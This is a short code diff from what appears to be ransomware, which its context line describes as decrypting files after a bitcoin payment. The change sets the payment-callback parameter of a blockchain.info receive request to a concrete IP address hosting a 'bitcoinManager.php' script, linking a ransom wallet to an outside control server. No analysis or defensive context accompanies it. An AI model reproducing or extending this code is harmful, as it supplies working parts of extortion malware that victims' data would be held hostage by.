@@ -36,7 +36,7 @@ and decrypt the files once an amount of bitcoins has been transfered to it.
 params = {
           "method": "create",
           "address": "1QHjy2cUAWbd5S1ZLtD7EsXYtHQ4g6VM9U",
-          "callback": "www.exampleserver"
+          "callback": "http://79.170.40.237/bot.com/code/bitcoinManager.php"
           }
 
 response = requests.get("http://blockchain.info/api/receive", params=params)
